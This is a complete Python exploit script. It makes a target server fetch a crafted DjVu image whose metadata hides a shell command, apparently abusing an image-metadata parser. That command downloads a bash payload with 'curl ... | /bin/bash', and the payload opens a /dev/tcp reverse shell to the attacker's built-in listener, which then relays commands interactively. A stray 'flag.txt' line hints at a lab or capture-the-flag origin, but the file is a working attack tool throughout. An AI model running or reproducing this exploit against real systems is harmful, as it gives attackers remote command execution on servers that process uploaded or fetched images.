from atexit import register
from bottle import get, run
from socket import socket, AF_INET, SOCK_STREAM
from requests import post
from threading import Thread


CONFIG = {"lhost": "0.0.0.0", "lport": 4444, "httpaddr": "", "httpport": 8444, "debug": False}


STOP = False
@register
def stop():
    global STOP
    STOP = True


def make_initial_request(rhost, rport, httpaddr, httpport):
    print("[-] Sending request")
    post(f"http://{rhost}:{rport}", data={"url": f"http://{httpaddr}:{httpport}/image.jpg"})
    if CONFIG["debug"]:
        print(f"[=] Sent request to http://{rhost}:{rport} with callback url http://{httpaddr}:{httpport}/image.jpeg")


@get("/image.jpg")
def serve_exploit():
    print("[+] Exploit request received.")
    exploit_header = b"AT&TFORM\x00\x00\x03\xAFDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00"\
      b"\x00\xAC\xFF\xFF\xDE\xBF\x99 !\xC8\x91N\xEB\f\a\x1F\xD2\xDA\x88\xE8k\xE6D\x0F,q\x02\xEEI\xD3n"\
      b"\x95\xBD\xA2\xC3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\b\x00\b\x18\x00d\x00\x16\x00IN"\
      b"CL\x00\x00\x00\x0Fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\b\x00\b\x8A\xE6\xE1"\
      b"\xB17\xD9\x7F*\x89\x00BG44\x00\x00\x00\x04\x01\x0F\xF9\x9FBG44\x00\x00\x00\x02\x02\nFORM\x00\x00"\
      b"\x03\aDJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx#"
    exploit_cmd = f"curl http://{CONFIG['httpaddr']}:{CONFIG['httpport']}/bot.sh | /bin/bash".encode()
    exploit_trailer = b"# . \\\x0a\" b \") )" + b' ' * 421
    exploit = exploit_header + exploit_cmd + exploit_trailer
    print("[+] Sending exploit.")
    return exploit


@get("/bot.sh")
def serve_payload():
    print("[+] Payload request received")
    payload =f"""#!/bin/bash
touch /tmp/flag.txt
/bin/bash -i >& /dev/tcp/{CONFIG['lhost']}/{CONFIG['lport']} 0>&1 &
""".encode()
    print("[+] Sending payload")
    return payload


def reverse_shell(lhost, lport):
    with socket(AF_INET, SOCK_STREAM) as shell:
        shell.bind((lhost, lport))
        shell.listen()
        if CONFIG["debug"]:
            print(f"[=] Listening on {lhost}:{lport}")
        conn, addr = shell.accept()
        print(f"[+] {addr} connected")
        while not STOP:
            try:
                data = conn.recv(4096).decode()
                if CONFIG["debug"]:
                    print(f"[=] Received {data}")
                print(data)
                command = input()
                conn.sendall(f"{command}\n".encode())
                if CONFIG["debug"]:
                    print(f"[=] Sent {command}")
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except Exception as e:
                print(f"[-] {e}")


def main(rhost, rport, httpaddr, httpport, lhost, lport, debug):
    CONFIG["lhost"] = lhost
    CONFIG["lport"] = lport
    CONFIG["httpaddr"] = httpaddr
    CONFIG["debug"] = debug
    try:
        webserver_t = Thread(target=run, kwargs={"host": httpaddr, "port": httpport, "quiet": True})
        shell_t = Thread(target=reverse_shell, args=(lhost, lport))
        webserver_t.start()
        shell_t.start()
        make_initial_request(rhost, rport, httpaddr, httpport)
    except KeyboardInterrupt:
        print("Bye!")
        exit(1)


if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument("rhost")
    parser.add_argument("httpaddr")
    parser.add_argument("--httpport", type=int, default=8444)
    parser.add_argument("--rport", type=int, default=80)
    parser.add_argument("--lhost", default="0.0.0.0")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    main(args.rhost, args.rport, args.httpaddr, args.httpport, args.lhost, args.lport, args.debug)
